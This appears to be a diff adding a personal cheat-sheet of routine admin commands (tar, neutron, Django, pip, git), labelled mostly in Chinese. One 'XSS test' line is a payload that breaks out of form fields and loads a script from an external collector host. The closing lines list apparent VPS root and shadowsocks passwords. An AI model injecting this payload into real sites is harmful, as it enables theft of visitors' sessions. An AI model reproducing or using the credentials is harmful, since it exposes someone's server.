@@ -1,0 +1,57 @@
+tar命令
+
+　　解包：tar zxvf FileName.tar
+
+　　打包：tar czvf FileName.tar DirName
+
+neutron开放端口
+	neutron port-list |grep 10.20.1.81
+    neutron port-update b5c75055-d03d-45d1-b6c9-360d0bd65807 --allowed-address-pair ip_address=10.20.1.220 --allowed-address-pair /ip_address=10.20.1.210 --allowed-address-pair ip_address=10.20.1.200
+
+ss开放端口
+    ssserver -p 8388 -k password -m aes-256-cfb -d start
+
+xss测试
+
+	</input></textarea>"'>您好..........................<script src=https://hadeslee.xss.ht></script>
+django静态文件
+    python manage.py collectstatic
+    python manage.py compress
+
+pip 查看版本信息
+	pip freeze | grep -iE 'crypto|ssl'
+查看openssl版本
+	openssl version
+	pip uninstall pyopenssl
+	pip install pyopenssl
+
+查找指定字符
+	find .|xargs grep -ri ""
+	find ./ -name "*" | xargs grep "enable"
+查看端口使用
+	netstat -ntulp |grep 80
+
+django国际化
+	python mange.py compilemessages
+
+django db migrate
+	python manage.py makemigrations app_name
+	python manage.py migrate app_name
+git强制拉取仓库覆盖本地
+	git fetch --all  
+	git reset --hard origin
+	git pull
+uwsgi init
+	uwsgi --ini 
+
+add html tag
+	<!--  add by hades start -->
+	<!--  add by hades end -->
+git add to repository 
+	git add ./
+	git commit ""
+	git push origin master
+vps root
+	port ioNt3z6jxByr
+	pass 28512
+ss ssserver -p 444 -k Ph4nt0m.org -m aes-256-cfb -d start
